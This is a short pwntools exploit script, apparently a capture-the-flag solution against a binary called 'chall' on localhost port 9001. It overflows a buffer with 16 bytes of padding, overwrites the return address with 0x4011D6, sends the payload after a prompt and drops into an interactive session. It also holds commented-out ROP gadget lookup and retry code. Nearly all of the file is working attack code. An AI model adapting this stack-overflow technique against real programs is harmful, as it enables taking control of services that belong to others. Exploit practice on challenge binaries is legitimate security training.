from pwn import *

binary_name = "chall"
remote_name = "localhost"
remote_port = 9001
libc_name = "libc.so.6"


def conn(exploit_target=0):
    if exploit_target == 0:
        return remote(remote_name, remote_port)

    if exploit_target == 1:
        return process(binary_name)

    if exploit_target == 2:
        return gdb.debug(
            binary_name,
            gdbscript="""
        b main
        c
        """,
        )

    return remote(remote_name, remote_port)


io = conn(exploit_target=0)

elf = ELF(binary_name)
libc = ELF(libc_name)

# rop = ROP(elf)
# pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address


payload = b"a" * 0x10
payload += p64(0x4011D6)


io.sendlineafter(b">", payload)

io.interactive()


# while True:
#     io = conn(exploit_target=0)
#     if exploit():
#         io.close()
#         continue
#     io.interactive()
#     break
